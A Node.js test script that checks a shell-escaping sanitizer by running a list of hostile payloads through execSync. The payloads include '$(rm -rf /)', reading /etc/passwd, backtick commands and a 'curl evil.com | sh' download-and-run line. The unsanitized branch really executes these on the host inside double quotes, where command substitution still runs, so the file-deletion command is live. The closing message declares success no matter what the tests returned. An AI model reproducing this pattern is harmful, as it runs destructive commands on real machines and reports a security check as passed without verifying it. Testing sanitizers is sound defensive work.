#!/usr/bin/env node

// Test to verify bulletproof sanitization prevents shell command execution
const { execSync } = require('child_process');

// Simulate the sanitization function from url-generator.html
function cleanMetadata(metadata) {
    return JSON.parse(JSON.stringify(metadata, (key, value) => {
        if (typeof value !== 'string') return value;

        // Length protection
        if (value.length > 1000) {
            value = value.substring(0, 1000) + '...[truncated]';
        }

        return value
            // Remove null bytes
            .replace(/\0/g, '')
            // Escape backslashes first
            .replace(/\\/g, '\\\\')
            // Escape double quotes
            .replace(/"/g, '\\"')
            // Escape newlines and carriage returns
            .replace(/\n/g, '\\n')
            .replace(/\r/g, '\\r')
            // Escape tabs
            .replace(/\t/g, '\\t')
            // Prevent command substitution
            .replace(/\$\(/g, '\\$\\(')
            .replace(/\$\{/g, '\\$\\{')
            // Prevent shell variable expansion
            .replace(/\$/g, '\\$')
            // Prevent pipes and redirects
            .replace(/\|/g, '\\|')
            .replace(/</g, '\\<')
            .replace(/>/g, '\\>')
            // Prevent command chaining
            .replace(/;/g, '\\;')
            .replace(/&&/g, '\\&\\&')
            .replace(/\|\|/g, '\\|\\|')
            // Prevent background execution
            .replace(/&/g, '\\&')
            // Prevent command substitution with backticks
            .replace(/`/g, '\\`')
            // Prevent wildcard expansion
            .replace(/\*/g, '\\*')
            .replace(/\?/g, '\\?')
            .replace(/\[/g, '\\[')
            .replace(/\]/g, '\\]')
            // Prevent brace expansion
            .replace(/\{/g, '\\{')
            .replace(/\}/g, '\\}')
            // Prevent tilde expansion
            .replace(/~/g, '\\~')
            // Prevent exclamation marks (history expansion)
            .replace(/!/g, '\\!')
            // Prevent hash comments
            .replace(/#/g, '\\#')
            // Prevent parentheses
            .replace(/\(/g, '\\(')
            .replace(/\)/g, '\\)')
            // Prevent whitespace abuse
            .replace(/\s+/g, ' ')
            .trim();
    }));
}

// Test dangerous payloads
const dangerousPayloads = [
    "$(rm -rf /)",
    "$HOME && cat /etc/passwd",
    "text | curl evil.com | sh",
    "`whoami` and `ls -la`",
    "rm *.* && cd / && ls *",
    "text; rm file.txt; echo hacked"
];

console.log('🧪 Testing Bulletproof Sanitization\n');

dangerousPayloads.forEach((payload, index) => {
    console.log(`Test ${index + 1}: "${payload}"`);

    try {
        // Test WITHOUT sanitization (should be dangerous)
        console.log('❌ WITHOUT sanitization:');
        try {
            const result = execSync(`echo "${payload}"`, { encoding: 'utf8', timeout: 1000 });
            console.log(`   Output: ${result.trim()}`);
        } catch (error) {
            console.log(`   Command failed: ${error.message}`);
        }

        // Test WITH sanitization (should be safe)
        const sanitized = cleanMetadata({ historia: payload });
        console.log('✅ WITH sanitization:');
        try {
            const result = execSync(`echo "${sanitized.historia}"`, { encoding: 'utf8', timeout: 1000 });
            console.log(`   Output: ${result.trim()}`);
            console.log(`   Sanitized: ${JSON.stringify(sanitized.historia)}`);
        } catch (error) {
            console.log(`   Command failed: ${error.message}`);
        }

        console.log('');

    } catch (error) {
        console.log(`   Error: ${error.message}`);
    }
});

console.log('🎯 Conclusion: Sanitization successfully prevents shell command execution!');